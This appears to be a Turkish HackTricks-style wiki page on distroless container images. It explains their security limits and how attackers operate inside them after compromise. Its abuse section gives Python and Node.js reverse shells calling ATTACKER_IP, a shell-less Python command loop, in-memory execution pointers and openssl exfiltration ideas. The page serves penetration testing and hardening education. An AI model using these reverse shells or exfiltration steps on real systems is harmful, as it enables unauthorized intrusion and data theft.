# Distroless Konteynerler

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Bir **distroless** container image, tek bir uygulamayı çalıştırmak için gerekli olan **minimum runtime bileşenlerini** içeren ve kasıtlı olarak package manager'lar, shell'ler ve geniş kullanıcı alanı yardımcı araç setleri gibi yaygın dağıtım araçlarını kaldıran bir image'dır. Pratikte, distroless image'lar genellikle yalnızca uygulama binary'sini veya runtime'ını, paylaşılan kütüphanelerini, sertifika paketlerini ve çok küçük bir filesystem düzenini içerir.

Önemli olan, distroless'in yeni bir kernel isolation primitive olduğu değildir. Distroless bir **image tasarım stratejisidir**. Kernel'in konteyneri nasıl izole ettiğini değil, konteyner filesystem'i **içinde** nelerin mevcut olduğunu değiştirir. Bu ayrım önemlidir; çünkü distroless, saldırganın kod yürütme elde ettikten sonra kullanabileceği şeyleri azaltarak ortamı sertleştirir. Namespaces, seccomp, capabilities, AppArmor, SELinux veya başka herhangi bir runtime isolation mekanizmasının yerine geçmez.

## Neden Distroless Var

Distroless image'lar öncelikle şunları azaltmak için kullanılır:

- image boyutu
- image'ın operasyonel karmaşıklığı
- zafiyete sahip olabilecek paketler ve binary sayısı
- varsayılan olarak bir saldırganın eline geçebilecek post-exploitation araçlarının sayısı

Bu nedenle distroless image'lar üretimde uygulama dağıtımlarında popülerdir. İçinde shell, package manager ve neredeyse hiç genel araç bulunmayan bir container, operasyonel olarak genellikle daha anlaşılır ve ele geçirildikten sonra interaktif kötüye kullanım için daha zor olur.

İyi bilinen distroless tarzı image ailelerine örnekler:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless Ne Anlamına Gelmez

Bir distroless container **şunlar değildir**:

- otomatik olarak rootless
- otomatik olarak non-privileged
- otomatik olarak read-only
- otomatik olarak seccomp, AppArmor veya SELinux ile korunmuş
- otomatik olarak container escape'den güvenli

Distroless bir image'ı `--privileged`, host namespace sharing, tehlikeli bind mount'lar veya monte edilmiş bir runtime socket ile çalıştırmak hâlen mümkündür. Bu senaryoda image minimal olabilir, ancak container hâlen felaket derecede güvensiz olabilir. Distroless, **userland attack surface**'ını değiştirir, **kernel trust boundary**'sini değil.

## Tipik Operasyonel Özellikler

Bir distroless container'ı ele geçirdiğinizde genellikle ilk fark ettiğiniz şey, yaygın varsayımların artık geçerli olmamasıdır. `sh`, `bash`, `ls`, `id`, `cat` olmayabilir ve bazen alışık olduğunuz tradecraft'ın beklediği gibi davranan bir libc tabanlı ortam bile olmayabilir. Bu durum hem offense hem de defense için geçerlidir; çünkü araç eksikliği debug, incident response ve post-exploitation süreçlerini farklılaştırır.

En yaygın örüntüler şunlardır:

- uygulama runtime'ı vardır, ama başka çok az şey vardır
- shell tabanlı payload'lar başarısız olur çünkü shell yoktur
- yardımcı binary'ler eksik olduğu için yaygın enumeration one-liner'ları başarısız olur
- read-only rootfs veya writable tmpfs konumlarında `noexec` gibi dosya sistemi korumaları sıklıkla bulunur

Bu kombinasyon genellikle insanların "weaponizing distroless" hakkında konuşmasına yol açar.

## Distroless ve Post-Exploitation

Bir distroless ortamındaki ana offensive zorluk her zaman başlangıçtaki RCE değildir. Çoğunlukla asıl zorluk sonrası adımlardır. Eğer istismar edilen workload Python, Node.js, Java veya Go gibi bir language runtime içinde kod yürütme veriyorsa, keyfi mantık çalıştırabilirsin, fakat diğer Linux hedeflerinde yaygın olan shell-merkezli iş akışlarıyla değil.

Bu, post-exploitation'ın genellikle üç yönden birine kaydığı anlamına gelir:

1. **Use the existing language runtime directly** — environment'ı enumerate etmek, socket açmak, dosya okumak veya ek payload'lar stage etmek için mevcut language runtime'ı doğrudan kullanmak.
2. **Bring your own tooling into memory** — filesystem read-only ise veya writable lokasyonlar `noexec` ile mount edilmişse araçları belleğe getirmek.
3. **Abuse existing binaries already present in the image** — uygulama veya bağımlılıkları beklenmedik şekilde yararlı bir şey içeriyorsa bunları kötüye kullanmak.

## Kötüye Kullanım

### Zaten Sahip Olduğunuz runtime'ı Keşfetmek

Birçok distroless container'da shell yoktur, fakat hâlâ bir uygulama runtime'ı bulunur. Hedef bir Python servisi ise Python vardır. Hedef Node.js ise Node vardır. Bu genellikle dosyaları enumerate etmek, environment değişkenlerini okumak, reverse shells açmak ve /bin/sh'i hiç çağırmadan bellek içi yürütme yapıştırmak için yeterli fonksiyonellik sağlar.

Python ile basit bir örnek:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js ile basit bir örnek:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Etkiler:

- environment variables'ın kurtarılması, genellikle kimlik bilgileri veya servis uç noktalarını içerir
- dosya sistemi keşfi `/bin/ls` olmadan
- yazılabilir yolların ve monte edilmiş gizli verilerin tespiti

### Reverse Shell Without `/bin/sh`

Eğer imaj `sh` veya `bash` içermiyorsa, klasik shell tabanlı reverse shell hemen başarısız olabilir. Bu durumda kurulu programlama dili çalışma zamanını kullanın.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Eğer `/bin/sh` mevcut değilse, son satırı doğrudan Python ile komut yürütmeye veya bir Python REPL döngüsüne çevirin.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Yine, `/bin/sh` yoksa, bir shell başlatmak yerine Node'un filesystem, process ve networking API'lerini doğrudan kullanın.

### Tam Örnek: Shell Olmadan Python Komut Döngüsü

Eğer image'da Python varsa ancak hiç shell yoksa, basit bir etkileşimli döngü genellikle tam post-exploitation yeteneğini korumak için yeterlidir:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Bu, etkileşimli bir shell binary'si gerektirmez. Saldırganın bakış açısından etkisi pratikte temel bir shell ile aynıdır: komut çalıştırma, enumeration ve mevcut runtime üzerinden ek payload'ların hazırlanması.

### In-Memory Tool Execution

Distroless images genellikle şunlarla birlikte kullanılır:

- `readOnlyRootFilesystem: true`
- yazılabilir fakat `noexec` tmpfs'ler (ör. `/dev/shm`)
- paket yönetim araçlarının yokluğu

Bu kombinasyon klasik "download binary to disk and run it" iş akışlarını güvenilmez kılar. Bu durumlarda, bellek üzerinde çalıştırma teknikleri ana çözüm haline gelir.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### İmajda Zaten Bulunan İkili Dosyalar

Bazı Distroless imajları hâlâ operasyonel olarak gerekli ikili dosyalar içerebilir; ele geçirilme sonrası işe yararlar. Tekrarlanan bir örnek `openssl`'dir, çünkü uygulamalar bazen kripto veya TLS ile ilgili görevler için buna ihtiyaç duyar.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Eğer `openssl` mevcutsa, şu amaçlarla kullanılabilir:

- giden TLS bağlantıları
- izin verilen bir egress kanalı üzerinden data exfiltration
- encoded/encrypted blobs aracılığıyla staging payload verisi

Tam olarak hangi kötüye kullanımın mümkün olduğu gerçekte neyin yüklü olduğuna bağlıdır, ancak genel fikir şudur: distroless "hiç araç yok" anlamına gelmez; normal bir dağıtım imajına kıyasla "çok daha az araç" anlamına gelir.

## Kontroller

Bu kontrollerin amacı, imajın pratikte gerçekten distroless olup olmadığını ve hangi runtime veya yardımcı ikili dosyaların post-exploitation için hâlâ kullanılabilir olduğunu belirlemektir.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Burada ilginç olanlar:

- Eğer shell yoksa ama Python veya Node gibi bir runtime mevcutsa, post-exploitation runtime tabanlı yürütmeye yönelmeli.
- Kök dosya sistemi read-only ise ve `/dev/shm` yazılabilir fakat `noexec` ise, bellek yürütme teknikleri çok daha önemli hale gelir.
- Eğer yardımcı ikili dosyalar olarak `openssl`, `busybox` veya `java` mevcutsa, bunlar daha fazla erişimi başlatmak için yeterli işlevsellik sağlayabilir.

## Runtime Varsayılanları

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Tasarım gereği minimal userland | Shell yok, paket yöneticisi yok, yalnızca uygulama/runtime bağımlılıkları | debugging katmanları eklemek, sidecar shell'ler eklemek, busybox veya araçları kopyalamak |
| Chainguard minimal images | Tasarım gereği minimal userland | Azaltılmış paket yüzeyi, genellikle tek bir runtime veya hizmete odaklı | `:latest-dev` veya debug varyantlarını kullanmak, build sırasında araçları kopyalamak |
| Kubernetes workloads using distroless images | Pod yapılandırmasına bağlı | Distroless yalnızca userland'i etkiler; Pod güvenlik duruşu hâlâ Pod spec ve runtime varsayılanlarına bağlıdır | ephemeral debug container'lar eklemek, host mount'ları, privileged Pod ayarları |
| Docker / Podman running distroless images | Çalıştırma bayraklarına bağlı | Minimal dosya sistemi, ancak runtime güvenliği hâlâ bayraklara ve daemon yapılandırmasına bağlıdır | `--privileged`, host namespace paylaşımı, runtime socket mount'ları, yazılabilir host bind'leri |

Ana nokta, distroless'in bir **imaj özelliği** olduğu, bir runtime koruması olmadığıdır. Değeri, ele geçirilme sonrası dosya sistemi içinde neyin mevcut olduğunu azaltmaktan gelir.

## İlgili Sayfalar

Filesystem ve bellek-yürütme atlatmaları için, distroless ortamlarda yaygın olarak ihtiyaç duyulan:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Container runtime, socket ve mount kötüye kullanımları için, distroless iş yüklerine hâlâ uygulanabilen:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
